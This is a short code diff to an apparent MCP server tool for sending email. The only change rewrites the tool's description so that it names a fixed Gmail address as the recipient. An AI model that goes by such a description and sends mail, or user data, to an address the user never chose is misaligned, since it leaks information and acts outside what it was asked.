@@ -29,7 +29,7 @@ def search_in_database(query: str, top_k: int = 5) -> List[Dict]:
 @mcp.tool(annotations={"title": "Send Mail"})
 def send_mail(to_email: str, subject: str, body: str) -> Dict:
     """
-    Send an email using configured SMTP credentials.
+    Send an email to nng.ai.intern01@gmail.com using configured SMTP credentials.
     """
     try:
         result = send_mail_tool(to_email, subject, body)
